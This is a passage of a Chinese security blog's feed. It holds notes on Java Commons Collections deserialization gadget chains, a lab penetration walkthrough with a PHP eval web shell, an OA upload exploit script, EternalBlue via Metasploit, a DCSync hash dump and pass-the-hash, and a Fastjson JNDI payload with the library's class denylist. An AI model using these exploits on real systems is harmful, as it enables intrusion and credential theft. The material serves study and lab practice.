class="comment">//åˆ›å»ºInvocationHandler</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(badAttributeValueExpException);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC7">CC7</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404233522172.png" alt="image-20240404233522172"></p><p>å…¥å£ç‚¹åˆ©ç”¨äº†HashTableé€šè¿‡readObjectä¸­è°ƒç”¨<code>reconstitutionPut</code>,ç„¶ååˆè°ƒç”¨äº†equalsï¼Œç„¶åæ‰¾åˆ°äº†AbstractMapDecoratorç±»ä¸­çš„equalsæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•ã€‚</p><p>ç„¶ååœ¨equalsä¸­å­˜åœ¨ä¸€ä¸ªå“ˆå¸Œç¢°æ’ï¼Œæ¯”è¾ƒç½•è§ï¼Œè¿™é‡Œå°±ä¸å±•å¼€æ¥ç ”ç©¶äº†ï¼Œå¯ä»¥å‚è€ƒfakesoulå¸ˆå‚…å†™çš„æ–‡ç« ï¼š</p><p><a href="https://xz.aliyun.com/t/12207#toc-10">https://xz.aliyun.com/t/12207#toc-10</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException,</span><br><span class="line">            IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] fakeformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">2</span>)&#125;;</span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,</span><br><span class="line">                        Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,</span><br><span class="line">                        Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap1.put(<span class="string">&quot;pP&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap2.put(<span class="string">&quot;oo&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;pP&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,transforms);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>æ¸—é€ Test one</title>
    <link href="https://bowuchuling.github.io/posts/1837i0jy.html"/>
    <id>https://bowuchuling.github.io/posts/1837i0jy.html</id>
    <published>2024-04-04T18:13:32.972Z</published>
    <updated>2024-04-06T05:44:42.846Z</updated>
    
    <content type="html"><![CDATA[<h1>æ¸—é€ Test one</h1><p>ç‚¸äº†å¥½å‡ æ¬¡ï¼Œæ—¶é—´å°±æ˜¯é‡‘é’±å•Šå®¶äººä»¬</p><h2 id="flag01">flag01</h2><p>å…ˆä¸Šfscanï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405004025355.png" alt="image-20240405004025355"></p><p>ç›´æ¥ä¸Šå·¥å…·æ¢­</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405004132547.png" alt="image-20240405004132547"></p><p>æŸ¥çœ‹sudoå¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œå‘ç°mysqlå¯ä»¥å…å¯†ä½¿ç”¨</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405004905520.png" alt="image-20240405004905520"></p><p>æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿ä¸‹ç¬¬ä¸€æ®µflag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405005213997.png" alt="image-20240405005213997"></p><p>flag{60b53231-</p><h2 id="flag02">flag02</h2><p>æŸ¥çœ‹ipï¼Œå‘ç°å­˜åœ¨å†…ç½‘ip</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405005257674.png" alt="image-20240405005257674"></p><p>ä¼ ä¸Šfscanå¼€æ‰«ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405005455480.png" alt="image-20240405005455480"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22.1.2</span>   DCåŸŸæ§</span><br><span class="line"><span class="number">172.22.1.21</span>  MS17-<span class="number">010</span>æ°¸æ’ä¹‹è“</span><br><span class="line"><span class="number">172.22.1.18</span>  ä¿¡å‘¼OAç³»ç»Ÿ</span><br></pre></td></tr></table></figure><p>å…ˆæ‰“OAï¼Œä¸Šfrpï¼Œè¿ä¸Šåå…ˆå¼±å£ä»¤ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¿¡å‘¼OAçš„åå°getshellæ¼æ´ï¼Œå‚è€ƒåšå®¢</p><p><a href="https://blog.csdn.net/solitudi/article/details/118675321">https://blog.csdn.net/solitudi/article/details/118675321</a></p><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://exp.py">exp.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;dGVzdA::&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWJjMTIz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;whoami&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>proxychains4.conf</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="keyword">python</span> <span class="built_in">exp</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><p>èšå‰‘é“¾æ¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405015859382.png" alt="image-20240405015859382"></p><p>2ce3-4813-87d4-</p><h2 id="flag03">flag03</h2><p>ä¸‹é¢æ‰“æ°¸æ’ä¹‹è“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">show options </span><br><span class="line"><span class="built_in">set</span> rhosts 172.22.1.21</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405020501207.png" alt="image-20240405020501207"></p><p>æˆåŠŸæ‹¿åˆ°shellã€‚</p><p>æ¥ä¸‹æ¥å¼€å§‹æ¨ªå‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºhash</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">proxychains</span>] DLL <span class="keyword">init</span>: proxychains-ng <span class="number">4.16</span></span><br><span class="line">[<span class="meta">proxychains</span>] DLL <span class="keyword">init</span>: proxychains-ng <span class="number">4.16</span></span><br><span class="line">[<span class="meta">DC</span>] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[<span class="meta">DC</span>] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[<span class="meta">DC</span>] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[<span class="meta">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="meta">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"><span class="number">502</span>     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        <span class="number">514</span></span><br><span class="line"><span class="number">1106</span>    Marcus  e07510a4284b3c97c8e7dee970918c5c        <span class="number">512</span></span><br><span class="line"><span class="number">1107</span>    Charles f6a9881cd5ae709abb4ac9ab87f24617        <span class="number">512</span></span><br><span class="line"><span class="number">1000</span>    DC01$   <span class="number">3</span>a54e96466a11502d4a8bd7dd1746911        <span class="number">532480</span></span><br><span class="line"><span class="number">500</span>     Administrator   <span class="number">10</span>cf89a850fb1cdbe6bb432b859164c8        <span class="number">512</span></span><br><span class="line"><span class="number">1104</span>    XIAORANG-OA01$  <span class="number">167e24</span>e8afb0c835f9d455cd19369556        <span class="number">4096</span></span><br><span class="line"><span class="number">1108</span>    XIAORANG-WIN7$  <span class="number">02f</span>74ed628cda09bde9a31940ffc05aa        <span class="number">4096</span></span><br></pre></td></tr></table></figure><p>hashä¼ é€’ï¼Œæ‹¿åˆ°flagã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb <span class="number">172.22</span>.<span class="number">1.2</span> -u administrator -H<span class="number">10</span>cf<span class="number">89</span>a<span class="number">850</span>fb<span class="number">1</span>cdbe<span class="number">6</span>bb<span class="number">432</span>b<span class="number">859164</span><span class="keyword">c</span><span class="number">8</span> -d xiaorang.lab -<span class="keyword">x</span> <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405020653891.png" alt="image-20240405020653891"></p><p>flag{60b53231-2ce3-4813-87d4-</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson 1.2.25&amp;42&amp;43&amp;45&amp;47</title>
    <link href="https://bowuchuling.github.io/posts/1uyhgiuj.html"/>
    <id>https://bowuchuling.github.io/posts/1uyhgiuj.html</id>
    <published>2024-03-28T11:27:53.662Z</published>
    <updated>2024-03-28T11:30:02.164Z</updated>
    
    <content type="html"><![CDATA[<h1>Fastjson 1.2.25&amp;42&amp;43&amp;45&amp;47</h1><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326102224599.png" alt="image-20240326102224599"></p><p>åœ¨ç‰ˆæœ¬ 1.2.25 ä¸­ï¼Œå®˜æ–¹å¯¹ä¹‹å‰çš„ååºåˆ—åŒ–æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œå¼•å…¥äº† checkAutoType å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ autoTypeSupport å…³é—­ï¼Œä¸èƒ½ç›´æ¥ååºåˆ—åŒ–ä»»æ„ç±»ï¼Œè€Œæ‰“å¼€ AutoType ä¹‹åï¼Œæ˜¯åŸºäºå†…ç½®é»‘åå•æ¥å®ç°å®‰å…¨çš„ï¼Œfastjson ä¹Ÿæä¾›äº†æ·»åŠ é»‘åå•çš„æ¥å£ã€‚</p><p><strong>com.alibaba.fastjson.parser.ParserConfig</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325194400099.png" alt="image-20240325194400099"></p><p>ä½œè€…åœ¨è¿™é‡Œå¢åŠ äº†autoTypeSupportå’Œé»‘åå•</p><p>å…¶ä¸­é»‘åå• denyList åŒ…æ‹¬ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>æ·»åŠ ååºåˆ—åŒ–ç™½åå•æœ‰3ç§æ–¹æ³•ï¼š</p><ol><li>ä½¿ç”¨ä»£ç è¿›è¡Œæ·»åŠ ï¼š<code>ParserConfig.getGlobalInstance().addAccept(â€œorg.chu0.fastjson.,org.javaweb.â€)</code></li><li>åŠ ä¸ŠJVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeAccept=org.chu0.fastjson.</code></li><li>åœ¨fastjson.propertiesä¸­æ·»åŠ ï¼š<code>fastjson.parser.autoTypeAccept=org.chu0.fastjson.</code></li></ol><p>æ³¨æ„ä¸‹é¢è¿™ä¸ªéƒ¨åˆ†ï¼Œè¿™æ˜¯æœ¬æ¬¡æ›´æ–°ä¸»è¦æ›´æ–°çš„waféƒ¨åˆ†DefaultJSONParser.class#parseObject</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325195533854.png" alt="image-20240325195533854"></p><p>æˆ‘ä»¬è·Ÿè¿›checkAutoTypeè¿›è¡Œåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325195811642.png" alt="image-20240325195811642"></p><p>è¿™é‡Œç”±äºæˆ‘å¹¶æ²¡æœ‰å¼€å¯autoTypeSupportï¼Œæ‰€ä»¥ä¸¤å±‚falseç›´æ¥è·³è¿‡äº†é»‘ç™½åå•çš„æ£€æŸ¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325200027354.png" alt="image-20240325200027354"></p><p>å¦‚æœåœ¨é»‘åå•éƒ¨åˆ†çš„è¯ï¼Œä¸‹é¢å°±ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œç»“æŸç¨‹åºï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325200424189.png" alt="image-20240325200424189"></p><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:9999/a\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONObject.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:9999/a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="å¿…é¡»å¼€å¯AutoType-ç»•è¿‡">å¿…é¡»å¼€å¯AutoType ç»•è¿‡</h2><h3 id="fj-1-2-42">fj &lt; 1.2.42</h3><p>ä¸»åŠ¨å¼€å¯AutoTypeSupport</p><figure class="highlight java"><table><tr><td 